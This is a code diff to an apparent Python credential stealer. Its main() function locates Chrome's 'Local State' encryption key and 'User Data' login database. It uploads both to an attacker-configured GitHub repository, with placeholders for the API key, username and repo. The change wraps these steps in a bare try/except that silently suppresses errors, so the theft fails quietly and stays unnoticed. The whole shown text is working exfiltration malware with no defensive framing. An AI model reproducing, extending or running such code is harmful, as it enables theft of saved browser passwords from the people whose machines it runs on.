@@ -48,15 +48,18 @@ def upload_login_data(github,path) :
 
 
 def main() : 
-    local_state = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
-    path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
-    api_key = ''     # PUT YOUR GITHUB ACCOUNT API KEY HERE
-    username = ''    # PUT YOUR ACCOUNT USERNAME HERE
-    repo_name = ''   # PUT GITHUB REPO NAME HERE
-    github = github_repo(api_key,username,repo_name) 
-    upload_secret_key(github,local_state)
-    upload_local_state(github,local_state)
-    upload_login_data(github,path)
+    try :
+        local_state = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
+        path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
+        api_key = ''     # PUT YOUR GITHUB ACCOUNT API KEY HERE
+        username = ''    # PUT YOUR ACCOUNT USERNAME HERE
+        repo_name = ''   # PUT GITHUB REPO NAME HERE
+        github = github_repo(api_key,username,repo_name) 
+        upload_secret_key(github,local_state)
+        upload_local_state(github,local_state)
+        upload_login_data(github,path)
+    except : 
+        pass
     
     
      
